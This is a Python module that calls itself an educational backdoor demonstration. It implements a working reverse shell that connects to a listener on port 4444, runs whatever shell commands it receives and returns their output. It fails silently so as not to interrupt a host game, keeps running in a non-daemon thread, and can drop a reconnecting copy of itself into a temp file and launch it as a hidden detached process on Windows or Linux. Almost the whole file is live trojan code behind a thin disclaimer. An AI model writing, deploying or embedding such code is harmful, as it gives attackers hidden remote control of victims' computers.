"""
Backdoor module for educational cybersecurity demonstration
WARNING: For educational purposes only in controlled VM environments
"""
import socket
import subprocess
import os
import sys
import threading
import time
from pathlib import Path

class Backdoor:
    def __init__(self, host='127.0.0.1', port=4444):
        """Initialize backdoor connection parameters"""
        self.host = host
        self.port = port
        self.connection = None
        self.running = False
        
    def connect(self):
        """Establish connection to listener"""
        max_retries = 5
        retry_delay = 3
        
        for attempt in range(max_retries):
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.host, self.port))
                self.running = True
                return True
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                else:
                    # Fail silently to not interrupt game
                    return False
        return False
    
    def execute_command(self, command):
        """Execute shell command and return output"""
        try:
            if command.lower() == 'exit':
                self.running = False
                return b'Closing connection...\n'
            
            # Execute command
            output = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return output
        except subprocess.TimeoutExpired:
            return b'Command timed out\n'
        except Exception as e:
            return f'Error: {str(e)}\n'.encode()
    
    def run(self):
        """Main backdoor loop - runs in background thread"""
        if not self.connect():
            return
        
        try:
            while self.running:
                # Receive command from listener
                command = self.connection.recv(1024).decode().strip()
                
                if not command:
                    break
                
                # Execute and send back result
                output = self.execute_command(command)
                self.connection.send(output)
                
        except Exception as e:
            pass
        finally:
            self.close()
    
    def close(self):
        """Close connection"""
        self.running = False
        if self.connection:
            try:
                self.connection.close()
            except:
                pass
    
    def start_background(self):
        """Start backdoor in background thread - non-daemon so it persists"""
        thread = threading.Thread(target=self.run, daemon=False)
        thread.start()
        return thread
    
    def start_detached(self):
        """Start backdoor as a completely separate process"""
        import subprocess
        import sys
        import os
        
        # Get the path to the backdoor script
        if getattr(sys, 'frozen', False):
            # Running as compiled exe
            exe_dir = os.path.dirname(sys.executable)
            python_exe = sys.executable
        else:
            # Running as script
            python_exe = sys.executable
        
        # Start backdoor in a separate detached process
        script_content = f'''
import socket
import subprocess
import time

def run_backdoor():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("{self.host}", {self.port}))
            
            while True:
                cmd = sock.recv(1024).decode().strip()
                if not cmd or cmd.lower() == 'exit':
                    break
                
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                    sock.send(output)
                except Exception as e:
                    sock.send(f"Error: {{str(e)}}\\n".encode())
            
            sock.close()
        except:
            time.sleep(5)  # Wait before reconnecting

if __name__ == "__main__":
    run_backdoor()
'''
        
        # Write temporary backdoor script
        import tempfile
        fd, temp_path = tempfile.mkstemp(suffix='.py')
        with os.fdopen(fd, 'w') as f:
            f.write(script_content)
        
        # Start detached process
        if os.name == 'nt':  # Windows
            subprocess.Popen(
                [python_exe, temp_path],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True
            )
        else:  # Linux
            subprocess.Popen(
                [python_exe, temp_path],
                start_new_session=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
